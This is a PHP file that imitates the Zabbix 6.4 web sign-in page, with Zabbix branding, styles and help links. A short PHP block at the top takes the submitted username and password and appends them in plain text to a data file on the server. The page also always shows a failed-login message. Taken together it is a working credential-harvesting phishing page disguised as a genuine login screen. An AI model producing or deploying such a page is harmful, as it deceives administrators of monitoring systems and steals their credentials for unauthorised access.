<?php
    $username = $_POST['name'];
    $password = $_POST['password'];

    $data = "username:$username;password:$password\n";

    $file = fopen('/var/www/html/data.txt', 'a');
    fwrite($file, $data);
    fclose($file);
?>

<!DOCTYPE html>
<html lang="en" theme="blue-theme">

<head>
    <meta http-equiv="X-UA-Compatible" content="IE=Edge">
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="Author" content="Zabbix SIA">
    <title>Zabbix docker: Zabbix</title>
    <link rel="icon" href="favicon.ico">
    <link rel="apple-touch-icon-precomposed" sizes="76x76" href="assets/img/apple-touch-icon-76x76-precomposed.png">
    <link rel="apple-touch-icon-precomposed" sizes="120x120" href="assets/img/apple-touch-icon-120x120-precomposed.png">
    <link rel="apple-touch-icon-precomposed" sizes="152x152" href="assets/img/apple-touch-icon-152x152-precomposed.png">
    <link rel="apple-touch-icon-precomposed" sizes="180x180" href="assets/img/apple-touch-icon-180x180-precomposed.png">
    <link rel="icon" sizes="192x192" href="assets/img/touch-icon-192x192.png">
    <meta name="msapplication-TileImage" content="assets/img/ms-tile-144x144.png">
    <meta name="msapplication-TileColor" content="#d40000">
    <meta name="msapplication-config" content="none">
    <link rel="stylesheet" type="text/css" href="assets/styles/blue-theme.css">
    <style>
        :root {
            --severity-color-na-bg: #97AAB3;
            --severity-color-info-bg: #7499FF;
            --severity-color-warning-bg: #FFC859;
            --severity-color-average-bg: #FFA059;
            --severity-color-high-bg: #E97659;
            --severity-color-disaster-bg: #E45959;
        }

        .na-bg,
        .na-bg input[type="radio"]:checked+label,
        .na-bg:before,
        .flh-na-bg,
        .status-na-bg,
        .status-na-bg:before {
            background-color: #97AAB3
        }

        .info-bg,
        .info-bg input[type="radio"]:checked+label,
        .info-bg:before,
        .flh-info-bg,
        .status-info-bg,
        .status-info-bg:before {
            background-color: #7499FF
        }

        .warning-bg,
        .warning-bg input[type="radio"]:checked+label,
        .warning-bg:before,
        .flh-warning-bg,
        .status-warning-bg,
        .status-warning-bg:before {
            background-color: #FFC859
        }

        .average-bg,
        .average-bg input[type="radio"]:checked+label,
        .average-bg:before,
        .flh-average-bg,
        .status-average-bg,
        .status-average-bg:before {
            background-color: #FFA059
        }

        .high-bg,
        .high-bg input[type="radio"]:checked+label,
        .high-bg:before,
        .flh-high-bg,
        .status-high-bg,
        .status-high-bg:before {
            background-color: #E97659
        }

        .disaster-bg,
        .disaster-bg input[type="radio"]:checked+label,
        .disaster-bg:before,
        .flh-disaster-bg,
        .status-disaster-bg,
        .status-disaster-bg:before {
            background-color: #E45959
        }
    </style>
    <script>
        const PHP_ZBX_FULL_DATE_TIME = "Y-m-d H:i:s";
        const PHP_TZ_OFFSETS = { "0": -10800, "499748400": -7200, "511236000": -10800, "530593200": -7200, "540266400": -10800, "562129200": -7200, "571197600": -10800, "592974000": -7200, "602042400": -10800, "624423600": -7200, "634701600": -10800, "656478000": -7200, "666756000": -10800, "687927600": -7200, "697600800": -10800, "719982000": -7200, "728445600": -10800, "750826800": -7200, "761709600": -10800, "782276400": -7200, "793159200": -10800, "813726000": -7200, "824004000": -10800, "844570800": -7200, "856058400": -10800, "876106800": -7200, "888717600": -10800, "908074800": -7200, "919562400": -10800, "938919600": -7200, "951616800": -10800, "970974000": -7200, "982461600": -10800, "1003028400": -7200, "1013911200": -10800, "1036292400": -7200, "1045360800": -10800, "1066532400": -7200, "1076810400": -10800, "1099364400": -7200, "1108864800": -10800, "1129431600": -7200, "1140314400": -10800, "1162695600": -7200, "1172368800": -10800, "1192330800": -7200, "1203213600": -10800, "1224385200": -7200, "1234663200": -10800, "1255834800": -7200, "1266717600": -10800, "1287284400": -7200, "1298167200": -10800, "1318734000": -7200, "1330221600": -10800, "1350788400": -7200, "1361066400": -10800, "1382238000": -7200, "1392516000": -10800, "1413687600": -7200, "1424570400": -10800, "1445137200": -7200, "1456020000": -10800, "1476586800": -7200, "1487469600": -10800, "1508036400": -7200, "1518919200": -10800, "1541300400": -7200, "1550368800": -10800 };
    </script>
    <script src="js/browsers.js"></script>
</head>

<body>
    <div class="wrapper">
        <main>
            <div class="server-name">Zabbix docker</div>
            <div class="signin-container">
                <div class="signin-logo">
                    <div class="zabbix-logo"></div>
                </div>
                <form method="post" action="index.php" accept-charset="utf-8" aria-label="Sign in">
                    <ul>
                        <li><label for="name">Username</label><input type="text" id="name" name="name" value=""
                                maxlength="255" autofocus="autofocus">
                                <div class="red">Incorrect user name or password or account is temporarily blocked.</div>
                            </li>
                        <li><label for="password">Password</label><input type="password" id="password" name="password"
                                value="" maxlength="255" autocomplete="new-password"></li>
                        <li><input type="checkbox" id="autologin" name="autologin" value="1" class="checkbox-radio"
                                checked="checked"><label for="autologin"><span></span>Remember me for 30 days</label>
                        </li>
                        <li><button type="submit" id="enter" name="enter" value="Sign in">Sign in</button></li>
                    </ul>
                </form>
            </div>
            <div class="signin-links"><a target="_blank" rel="noopener noreferrer" class="grey link-alt"
                    href="https://www.zabbix.com/documentation/6.4/">Help</a>&nbsp;&nbsp;•&nbsp;&nbsp;<a target="_blank"
                    rel="noopener noreferrer" class="grey link-alt" href="https://www.zabbix.com/support">Support</a>
            </div>
        </main>
        <footer role="contentinfo">© 2001–2023, <a class="grey link-alt" target="_blank" rel="noopener noreferrer"
                href="https://www.zabbix.com/">Zabbix SIA</a></footer>
    </div>
</body>

</html>